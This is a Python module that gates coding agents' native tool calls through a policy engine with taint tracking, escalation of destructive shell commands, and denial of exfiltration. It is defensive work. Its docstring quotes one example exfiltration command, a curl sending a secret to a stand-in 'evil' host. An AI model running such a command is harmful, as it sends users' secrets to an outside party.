"""Govern a coding agent's NATIVE tools (Claude Code / Cursor / Codex).

An MCP gateway only sees `tools/call` — it is blind to Claude Code's built-in
Edit / Write / Bash / Read, Cursor's editor + terminal, and Codex's shell. Those
are where the real risk lives (a `curl evil?data=$SECRET`, a force-push, an edit
outside the repo).

A client-side PreToolUse hook closes that gap: it POSTs each candidate native
tool call to ``/gate/evaluate`` here, we run KAIROS (authority + fidelity +
ceiling + attest) over a per-agent engine, and return allow / ask / deny. Every
call lands on the same mission-control feed + ledger as the MCP gateway, and the
same operator kill switch tightens it. ``/gate/observe`` (PostToolUse) feeds read
outputs into the taint tracker so a later egress carrying them is caught.

The engine reuses the coding-agent Domain Profile: read/edit/bookkeeping run
autonomously in scope, shell/web notify, destructive shell escalates, and a
sensitive value read that flows into a shell/web call is denied as exfiltration.
"""

from __future__ import annotations

from typing import Any

from eidolon.api import live as live_svc
from eidolon.api.hosted import LocalReporter

# The native tool map, destructive-shell classifier, policies and seeds live in
# the web-free ``eidolon.gateway.coding`` (shared with embedders); the hook
# endpoints re-export ``classify`` and ``decision_for`` from here.
from eidolon.gateway.coding import CLASSES, DESTRUCTIVE, classify, tool_policies
from eidolon.gateway.coding import permission_decision as decision_for

__all__ = ["CodingEngineCache", "build_coding_engine", "classify", "decision_for"]


def build_coding_engine(agent: dict, sf, hub):
    """A per-agent GovernanceEngine over the coding-agent profile + native tools."""
    from eidolon.api import accounts as acc
    from eidolon.common import crypto
    from eidolon.gateway.config import GatewayConfig, build_engine
    from eidolon.gateway.orgpolicy import OrgPolicy
    from eidolon.sage import InMemorySagePort

    _, authority = acc.split_preset(agent["preset"])
    preset = acc.PRESETS[authority]
    org_id = agent.get("org_id")
    policy = acc.get_org_policy(sf, org_id) if org_id else {}
    org_pol = OrgPolicy(lambda: acc.get_org_policy(sf, org_id)) if org_id else None
    key = crypto.generate_keypair()
    cfg = GatewayConfig(
        profile_id="coding-agent",
        principal_signing_key=key.signing_key_hex,
        scope={"project": ["workspace"]},
        permitted_classes=list(CLASSES),
        max_autonomy=preset["max_autonomy"],
        # No seeded precedent needed: the coding-agent profile grounds routine
        # classes in the class itself (fidelity_rubric.baseline_precedent).
        tool_policies=tool_policies(),  # type: ignore[arg-type]
        extra_escalation_required=list(policy.get("approval_classes") or []),
        default_class=DESTRUCTIVE,
        tool_classifier="coding",  # unknown native tools fail closed (escalate)
        gateway_id=agent["id"], agent_name=agent["name"],
    )
    engine = build_engine(cfg, sage=InMemorySagePort(), org_policy=org_pol)
    engine._reporter = LocalReporter(sf, hub, agent["id"], agent["name"])  # noqa: SLF001
    return engine


class CodingEngineCache:
    """Per-agent coding engines, built lazily and reused so taint + kill state
    persist across a session's tool calls."""

    def __init__(self, store, hub, max_agents: int = 500) -> None:
        self._store = store
        self._hub = hub
        self._max = max_agents
        self._engines: dict[str, Any] = {}

    def for_agent(self, agent: dict):
        eng = self._engines.get(agent["id"])
        if eng is None:
            if len(self._engines) >= self._max:
                self._engines.pop(next(iter(self._engines)), None)
            eng = build_coding_engine(agent, self._store(), self._hub)
            self._engines[agent["id"]] = eng
        return eng

    def evict(self, agent_ids) -> None:
        """Drop cached engines so they rebuild with fresh org policy (e.g. after
        an admin changes must-approve classes). Path/egress rules refresh live."""
        for aid in set(agent_ids):
            self._engines.pop(aid, None)


def event_snapshot(sf, gateway_id: str) -> dict:
    """A tiny recent-activity snapshot for the hook to echo (optional)."""
    try:
        evs = live_svc.recent_events(sf, limit=5)
        return {"recent": [e for e in evs if e.get("gateway_id") == gateway_id][:5]}
    except Exception:  # noqa: BLE001
        return {"recent": []}
